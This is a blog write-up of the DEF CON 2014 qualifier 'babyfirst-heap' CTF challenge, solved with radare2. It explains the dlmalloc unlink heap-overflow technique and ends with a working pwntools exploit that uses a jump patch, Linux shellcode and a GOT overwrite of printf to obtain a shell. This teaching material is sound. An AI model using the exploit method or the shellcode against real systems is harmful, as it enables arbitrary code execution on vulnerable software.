---
author: alvaro
comments: true
layout: post
title: "Solving 'heap' from DefCON 2014 qualified with r2"
categories:
- Archive
tags:
- security
---


This article will introduce r2 to resolve a simple CTF from Defcon '14 using Linux. For those who do not know radare2 is a `unix-like reverse engineering framework and commandline tools` and the most important thing about it is that it is open source thus we can play with it. 

Radare2 gives us the possibility to do reverse engineering and more by free as we will look on this post though we are not going too deeply into the commands. I leave it as an exercise for the reader.

Most people complain about the lack of doc that r2 has but that is far from the truth. Radare has:

* Open source [Book](https://www.gitbook.com/book/radare/radare2book/details) in which anyone can contribute.
* [Talks](http://radare.org/r/talks.html).
* [Asciinema](http://radare.tv/) showing usage examples.
* If you append `?` in each command in r2's console you will get a little help.
* There is a [blog](http://radare.today/).
* IRC channel on freenode.net `#radare`. 
* Last but not least we have the source code.

The first thing we are going to need is the binary on which we are going to play with.

```
wget https://github.com/ctfs/write-ups-2014/raw/master/def-con-ctf-qualifier-2014/heap/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
```

The second one and the most important is radare2 and its tool suites. There is a tip in r2 land and it is `use radare2 always from git` because of r2 is under strong development and it's always including fixes and new features.

```
git clone https://github.com/radare/radare2.git
cd radare2
./sys/install.sh
$ r2 -v # to test that the installation was successful
# after the installation we have these utilites
r2agent  r2pm     rabin2   radare2  radiff2  rafind2  ragg2    rahash2  ranal2   rarun2   rasign2  rasm2    rax2
```

We are ready to to do the CTF. As usual in security the first thing to accomplish is gather information, in this case about the binary.

```
[alvaro @ ctf] $ ./babyfirst-heap

Welcome to your first heap overflow...
I am going to allocate 20 objects...
Using Dougle Lee Allocator 2.6.1...
Goodluck!

Exit function pointer is at 804C8AC address.
[ALLOC][loc=9076008][size=1246]
[ALLOC][loc=90764F0][size=1121]
[ALLOC][loc=9076958][size=947]
[ALLOC][loc=9076D10][size=741]
[ALLOC][loc=9077000][size=706]
[ALLOC][loc=90772C8][size=819]
[ALLOC][loc=9077600][size=673]
[ALLOC][loc=90778A8][size=1004]
[ALLOC][loc=9077C98][size=952]
[ALLOC][loc=9078058][size=755]
[ALLOC][loc=9078350][size=260]
[ALLOC][loc=9078458][size=877]
[ALLOC][loc=90787D0][size=1245]
[ALLOC][loc=9078CB8][size=1047]
[ALLOC][loc=90790D8][size=1152]
[ALLOC][loc=9079560][size=1047]
[ALLOC][loc=9079980][size=1059]
[ALLOC][loc=9079DA8][size=906]
[ALLOC][loc=907A138][size=879]
[ALLOC][loc=907A4B0][size=823]
Write to object [size=260]:
aaaaaa
Copied 7 bytes.
[FREE][address=9076008]
[FREE][address=90764F0]
[FREE][address=9076958]
[FREE][address=9076D10]
[FREE][address=9077000]
[FREE][address=90772C8]
[FREE][address=9077600]
[FREE][address=90778A8]
[FREE][address=9077C98]
[FREE][address=9078058]
[FREE][address=9078350]
[FREE][address=9078458]
[FREE][address=90787D0]
[FREE][address=9078CB8]
[FREE][address=90790D8]
[FREE][address=9079560]
[FREE][address=9079980]
[FREE][address=9079DA8]
[FREE][address=907A138]
[FREE][address=907A4B0]
Did you forget to read the flag with your shellcode?
Exiting
```

Just running it, it gives us a lot of information. The most important in my opinion is `Using Dougle Lee Allocator 2.6.1`. Just with that we already know about which is our mission here and basically is to fool the memory allocator to overwrite inline metadata to be able to write in arbitrary memory locations. If you do not know about what I am talking about I encourage to read the following articles before to continue: [phrack 57-8] (http://www.phrack.org/issues/57/8.html#article) and [Solar Designer](http://www.openwall.com/articles/JPEG-COM-Marker-Vulnerability).

We should download the source code of our allocator to know how to make our exploit work.

```
wget ftp://g.oswego.edu/pub/misc/malloc-2.6.1.c
```
The most important of the code is.
```C
struct malloc_chunk
{
  size_t size;               /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;   /* double links -- used only if free. */
  struct malloc_chunk* bk;
  size_t unused;             /* to pad decl to min chunk size */
};

#define unlink(p)                                                             \
{                                                                             \
  mchunkptr Bul = (p)->bk;                                                    \
  mchunkptr Ful = (p)->fd;                                                    \
  Ful->bk = Bul;  Bul->fd = Ful;                                              \
}                                                                             \
```

If you read the article that I pointed before you already know why this is important. If not badly done but the idea is how the allocator handle the memory. It handles memory using `malloc_chunk` and depending on whether the memory is allocated or freed its fields have different meanings (take into account the difference between the phrack article and our case).

```
 chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
             | size: size of the chunk (the number of bytes between    |
             | "chunk" and "nextchunk") and 2 bits status information  |
      mem -> +---------------------------------------------------------+
             | fd: not used by dlmalloc because "chunk" is allocated   |
             | (user data therefore starts here)                       |
             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
             | bk: not used by dlmalloc because "chunk" is allocated   |
             | (there may be user data here)                           |
             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
             .                      User data                          .
nextchunk -> + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
```
The idea will be to overwrite the `size`, `fd` and `bk` on the `nextchunk` to execute `unlink` and get a shell. We can get a shell overwritten this fields because the `unlink` macro is as follows.

``` C
#define unlink(p)                                                             \
{                                                                             \
  mchunkptr BK = (p)->bk;                                                    \
  mchunkptr FD = (p)->fd;                                                    \
  FD+8 = BK;  
  BK+4 = FD;                                                                  \
}                                                                             \

```

We are able to write in `FD+8` the direction of `BK` which will be the direction of our shellcode. However, we are written in `BK+4` as well so we need to overcome this issue.

Until this point I hope that more or less the how to exploit the binary be clear.

It's time to get our hands dirty using r2 and continue getting info from our binary. Radare2 at first can seem difficult but once you start learning is very powerfull it's the same feeling than `vim`. The best part is that r2 follows the same philosophy as vim and every command has a meaning; it just a matter of time to get used to them.

1. `a` and its subcommands stand by analyze.
  * `af` = analyze function
  * `aac` = analyze calls
  * ...
2. `i` and its subcommands stand by info.
  * `is` = info symbols
  * `ii` = info imports
  * ...
3. `~` is the internal grep
4. `@` temporal seek

```bash
[alvaro @ ctf] $ r2 babyfirst-heap
 -- Execute a command every time a breakpoint is hit with 'e cmd.bp = !my-program'
[0x080486f0]> i?
... get help and to know what does this command
[0x080486f0]> # ~ is the internal grep
[0x080486f0]> i~pic,nx,canary
pic      false
canary   false
nx       true
[0x080486f0]> ik~relro
elf.relro=partial relro
```

```
[alvaro @ ctf] $ ./babyfirst-heap &
[1] 11677
[1]+  Detenido                ./babyfirst-heap
[alvaro @ ctf] $ cat /proc/11677/maps |grep heap
...
097e2000-097e8000 rwxp 00000000 00:00 0                                  [heap]
```
We have in our hands a binary without PIC, with partial RELRO and executable heap. It means that we can modify a [GOT entry](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html) to get control over the program execution flow and allocate our shellcode on the heap.

```bash
[alvaro @ ctf] $ r2 babyfirst-heap
 -- Insert coin to continue..
[0x080486f0]> ir # get the binary's relocations
[Relocations]
vaddr=0x0804bff0 paddr=0x00002ff0 type=SET_32 __gmon_start__
vaddr=0x0804c880 paddr=0x00003880 type=ADD_64
vaddr=0x0804c884 paddr=0x00003884 type=ADD_64
vaddr=0x0804c8a0 paddr=0x000038a0 type=ADD_64
vaddr=0x0804c000 paddr=0x00003000 type=SET_32 mprotect
vaddr=0x0804c004 paddr=0x00003004 type=SET_32 printf
vaddr=0x0804c008 paddr=0x00003008 type=SET_32 memcpy
vaddr=0x0804c00c paddr=0x0000300c type=SET_32 signal
vaddr=0x0804c010 paddr=0x00003010 type=SET_32 alarm
vaddr=0x0804c014 paddr=0x00003014 type=SET_32 _IO_getc
vaddr=0x0804c018 paddr=0x00003018 type=SET_32 puts
vaddr=0x0804c01c paddr=0x0000301c type=SET_32 __gmon_start__
vaddr=0x0804c020 paddr=0x00003020 type=SET_32 exit
vaddr=0x0804c024 paddr=0x00003024 type=SET_32 __libc_start_main
vaddr=0x0804c028 paddr=0x00003028 type=SET_32 fprintf
vaddr=0x0804c02c paddr=0x0000302c type=SET_32 setvbuf
vaddr=0x0804c030 paddr=0x00003030 type=SET_32 memset
vaddr=0x0804c034 paddr=0x00003034 type=SET_32 sbrk

18 relocations
[0x080486f0]> S # get sections
[00] . 0x00000154 -r-- va=0x08048154 sz=0x0013 vsz=0x0013 .interp
....
[21] . 0x00002ff0 -rw- va=0x0804bff0 sz=0x0004 vsz=0x0004 .got
[22] . 0x00002ff4 -rw- va=0x0804bff4 sz=0x0044 vsz=0x0044 .got.plt
[23] . 0x00003040 -rw- va=0x0804c040 sz=0x0824 vsz=0x0824 .data
....
```

To dissasemble the binary and read what is going on exactly, just run these commands.

```
[alvaro @ ctf] $ r2 babyfirst-heap
 -- Change the UID of the debugged process with child.uid (requires root)
[0x080486f0]> s main # seek to the main symbol
[0x0804890b]> af # define a function
[0x0804890b]> Vp # get into visual mode, p rotates the print mode, by default is in hex (without p)
use j/k to navigate and ? for help 
```

If you understand the code you will see that the object that we are going to overflow is always the same size and it resides in `esp + 0x60`

```
0x080489d6   cmp dword [esp + 0x133c], 0xa                 ; [0xa:4]=0 ; main.c:133
0x080489de   jne 0x80489eb                                 ;[4]
0x080489e0   mov dword [esp + 0x1338], 0x104               ; [0x104:4]=196 ; main.c:134 
..
esp+0x1338 will hold the size in this case 0x104=206 (run: rax2 0x104)
```

Now it's time to debug to understand even better the binary.

[![asciicast](https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb.png)](https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb) 

As you just saw we have full control of the next chunk and our mission will be.

* Write the next size field with the latest bit to 1. This will fool the allocator making it think that the chunk is free and the allocator will call unlink.
* Write in the `fd` field the direction of the relocation of printf minus 8. Why minus 8? If you look again in the unlink function it makes `FD->bk = BK` that is equivalent to `fd+8 = BK` now just substitute `fd` with `&reloc_printf - 8` and you will write on `reloc_printf`. To get the location of `reloc_printf` just run in r2's console `ir~printf`.
* Write in `bk` the direction of our shellcode that the binary itself gives us.


But there is still one thing to solve. In the `unlink` function `BK+4` is overwritten so our shellcode must take this into account. How we can do that? Just patch the shellcode at the beginning to make a jmp. We use rasm2 to get the exact bytes we need.

```
[alvaro @ ~] $ rasm2 -a x86 -b 32 'jmp 0x10'
eb0c
```

The first instruction will jump and whatever is written in `BK+4` doesn't matter :). The finally exploit is.

```python
from pwn import *
import re

reloc_printf = 0x0804c004 # ir~printf

conn = remote ('127.0.0.1', 8080)
output = conn.recv()

s = re.search ("\[ALLOC\]\[loc=[a-z,A-z,0-9]+\[size=260\]", output)
dir_shellcode = int(s.group()[12:19],16)
nop = "\x90" * 30
#shellcode from http://shell-storm.org/shellcode/files/shellcode-752.php
shellcode = nop + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

payload = "\xeb\x0c" # jmp_patch
payload += shellcode
payload += "A"* (260 - len(payload))
payload += p32(0x1) # make the next chunk free
payload += p32(reloc_printf - 8)
payload += p32(dir_shellcode)

conn.send (payload + '\n')
conn.interactive()
```

Here our shell

[![asciicast](https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews.png)](https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews) 
